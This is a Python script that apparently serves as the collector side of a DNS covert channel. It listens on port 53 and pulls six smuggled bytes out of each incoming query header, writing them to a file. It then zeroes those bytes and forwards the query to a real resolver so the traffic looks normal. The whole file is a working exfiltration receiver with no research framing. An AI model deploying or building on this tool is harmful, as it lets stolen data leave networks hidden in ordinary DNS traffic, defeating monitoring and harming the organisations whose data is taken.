#!/usr/bin/env python3
import socket
import dnslib

import os

n_times_6_bytes = 0
secret_bytes: bytes
collector_ip = '1.1.1.1'  # FIXME
end_file = False


def receive_data(udps, file):
    types = {1: "A", 2: "NS", 15: "MX", 16: "TXT", 28: "AAAA"}
    data, addr = udps.recvfrom(1024)
    data, secret = decode_data(data, file)
    dnsD = dnslib.DNSRecord.parse(data)
    try:
        type = types[dnsD.questions[0].qtype]
    except KeyError:
        type = "OTHER"
    labels = dnsD.questions[0].qname.label
    answer = dnsD.reply()
    domain = b'.'.join(labels)
    domain = domain.decode()
    return data, addr, type, domain, answer, secret


def forward_dns_request(data, next_dns_address="1.1.1.1"):
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.sendto(data, (next_dns_address, 53))
    data, addr = udps.recvfrom(1024)

    return data


def decode_data(data, file):
    global end_file
    secret = data[6:12]
    padding: bytes = b'\x00' * 6
    data = data[0:6] + padding + data[12:]
    if not end_file:
        file.write(secret)
    if b'\x00' in secret:
        file.close()
        end_file = True
    return data, secret


def main_collector_loop(udps):
    with open("decoded.txt", 'ab') as file:
        while True:
            data, addr, type, domain, answer, secret = receive_data(udps, file)
            answer = forward_dns_request(data, '1.1.1.1')
            udps.sendto(answer, addr)


def drop_privileges():
    try:
        uid = int(os.environ['SUDO_UID'])
        if uid > 0:
            print("Dropping privileges to UID %d" % uid)
            os.setuid(uid)
    except:
        print("Warning: Failed to drop privileges")


def init_listener():
    try:
        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udps.bind(('0.0.0.0', 53))
        return udps
    except PermissionError:
        print("This script must be run as root if you want to listen " +
              "on port %d" % 53)
        exit(1)


def main():
    udps = init_listener()
    drop_privileges()
    try:
        main_collector_loop(udps)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()
